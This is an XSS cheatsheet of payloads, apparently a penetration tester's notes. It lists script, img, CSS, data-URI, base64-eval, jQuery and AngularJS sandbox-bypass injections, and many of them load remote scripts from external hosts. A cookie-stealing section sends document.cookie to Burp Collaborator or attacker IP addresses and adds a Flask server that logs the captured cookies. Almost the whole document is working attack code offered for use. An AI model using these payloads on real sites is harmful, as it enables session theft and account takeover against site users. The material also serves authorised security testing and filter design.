# XSS Cheatsheet

Resources: 
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://portswigger.net/research/xss-without-parentheses-and-semi-colons

XSS Payloads references below:
- https://aerst.one/p/xss.html
- https://thegetch.github.io/x


## In `<body>` tag:

```javascript
<body onload=alert('test1')>
```

## In `<script>` tags:

```javascript
<script>alert(1);</script>
```

```javascript
<script>alert("XSS");</script>
```

- URL encoded:`%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%58%53%53%22%29%3b%3c%2f%73%63%72%69%70%74%3e`
- HTML encoded:`&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;`

No quotes:

```javascript
<script src=//thegetch.github.io/x></script>
```

Added spaces:

```javascript
<script src = //thegetch.github.io/x></script>
```

With quotes:

```javascript
<script src="//thegetch.github.io/x"></script>
```

Other alternatives:

```javascript
<script x src = //thegetch.github.io/x></script>
```

```javascript
< SCRIPT X SRC = //THEGETCH.GITHUB.IO/X></SCRIPT>
```

No parentheses:

```javascript
<script>onerror=alert;throw 1337</script>
```

No parentheses or semicolon:

```javascript
<script>{onerror=alert}throw 1337</script>
```

Throw with expression:

```javascript
<script>throw onerror=alert,'some string',123,'haha'</script>
```

## css:

```javascript
<style>body{background:url('javascript:var x=document.createElement("script");x.src="https://thegetch.github.io/x";document.body.appendChild(x)')}</style>
```

## In `<img>` tags:

```javascript
<img src=x onerror='var x=document.createElement("script");x.src="//thegetch.github.io/x";document.body.appendChild(x);'>
```

```javascript
<img src=x onerror='var x=document.createElement(\"script\");x.src = "//thegetch.github.io/x";document.body.appendChild(x);'>
```

```javascript
<img src onerror = 'var x=document.createElement("script");x.src = "//thegetch.github.io/x";document.body.appendChild(x);'>
```

```javascript
<img src=# onmouseover='var x=document.createElement("script");x.src = "//thegetch.github.io/x";document.body.appendChild(x);'>
```

```javascript
<img src=x onerror=alert(1) />
```

```javascript
<img src=x onerror="alert(1)" />
```

```javascript
<img src=x onerror=alert("XSS") /> 
```

```javascript
<IMG SRC="javascript:alert('Vulnerable');">
```

```javascript
<IMG SRC=javascript:alert('XSS')>
```

```javascript
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

```javascript
<IMG SRC=javascript:alert("XSS")>
```

```javascript
<IMG SRC=`javascript:alert("RSnake says,'XSS'")`>
```

```javascript
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
```

```javascript
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```

```javascript
<IMG SRC=javascript:alert('XSS')>
```

## Using Data URIs: 
- https://www.paladion.net/blogs/bypass-xss-filters-using-data-uris

Base64-decoded payload: 

```javascript
<script>alert("Hello");</script>
```

Base64-encoded payload:

```
PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
```

In data URI:

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
```

In data URI image:

```
data:image/gif;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpIC8+
```

## Base64 eval:

```
eval(atob('dmFyIHg9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7eC5zcmMgPSAiLy9hZXJzdC5vbmUvcC94Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=='))
```

- From <https://aerst.one/p/xss.html> 

## jQuery:

```javascript
$.getScript('//thegetch.github.io/x');
```

Examples:

```javascript
;}$(document).ready(function(){$.getScript(%27//thegetch.github.io/x%27)});x=function(){a=%27
```

```javascript
&vulnfield=
thegetch%27);}});};$.getScript(%27//thegetch.github.io/x%27);x=function(){getDate(function(){x=function(){x=(%27
&otherfield=blah.....
```

```javascript
&vulnfield=
*/%27];$.getScript(%27//thegetch.github.io/x%27);/*
&otherfield=blah.....	  	
```

## In json format:

```json
"certificationVersion":"https://aerst.one/p/xss2.svg"
```

### Stealing Cookies 

Stored XSS to steal cookies (using Burp Collaborator):

```javascript
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{method: 'POST',mode: 'no-cors',body:document.cookie});</script> 
```

Stored XSS to steal cookies (using Flask in Python):

```python
from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():

    cookie = request.args.get('c')
    f = open("cookies.txt","a")
    f.write(cookie + ' ' + str(datetime.now()) + '\n')
    f.close()

    return redirect("http://answers/")

if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5000)
```

Payload to inject:

```javascript
<script>document.location="http://YOUR_IP:PORT/cookie/" + document.cookie </script>
```

onmouseover:

```javascript
onmouseover='document.location=%22https://<your_Burp_Collab>.burpcollaborator.net?%22.concat(document.cookie)
```

or

```javascript
onmouseover='setTimeout(function()%7Bdocument.location=%22https://<your_Burp_Collab>.burpcollaborator.net?%22.concat(document.cookie);%7D,1)
```

or

```javascript
onmouseover='document.write(%22<img src=https://<your_Burp_Collab>.burpcollaborator.net?%22.concat(document.cookie).concat(%22 />%22))
```

or

```javascript
<script>
var i = new Image();
i.src="//<your_Burp_Collab>.burpcollaborator.net?q="+document.cookie;
</script>
```

XSS payload:

```javascript
<script src=http://attacker_IP:5000/?c="+document.cookie;></script>
```

Or

```javascript
<script type="text/javascript">document.location="http://attacker_IP:5000/?c="+document.cookie;</script>
```

- From <https://medium.com/@laur.telliskivi/pentesting-basics-cookie-grabber-xss-8b672e4738b2> 


## Other examples:

GET Requests (URL):

```javascript
&vulnfield=test"><img src=x onerror='var x=document.createElement("script");x.src = "//thegetch.github.io/x";document.body.appendChild(x);'>
```

```javascript
vulnfield=foobar'%3e <img src=x onerror='var x=document.createElement("script");x.src = "//thegetch.github.io/x";document.body.appendChild(x);'>
```

POST Requests:

```javascript
thegetch%22%3e<img src=x onerror='var x=document.createElement("script");x.src = "//thegetch.github.io/x";document.body.appendChild(x);'>
```

From somedev on twitter:

```javascript
'"--><DeTails/opEn/oNTOggLe=(pro\u006dpt)``//
```

## AngualrJS XSS:

- https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs

List of Sandbox bypasses:

1.0.1 - 1.1.5

```javascript
{{constructor.constructor('alert(1)')()}}
```

1.2.0 - 1.2.1

```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

1.2.2 - 1.2.5

```javascript
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

1.2.6 - 1.2.18

```javascript
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

1.2.19 - 1.2.23

```javascript
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

1.2.24 - 1.2.29

```javascript
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

1.3.0

```javascript
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

1.3.1 - 1.3.2

```javascript
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}
```

1.3.3 - 1.3.18

```javascript
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

1.3.19

```javascript
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}
```

1.3.20

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

1.4.0 - 1.4.9

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

1.5.0 - 1.5.8

```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} 
```

1.5.9 - 1.5.11

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

>=1.6.0

```javascript
{{constructor.constructor('alert(1)')()}}
```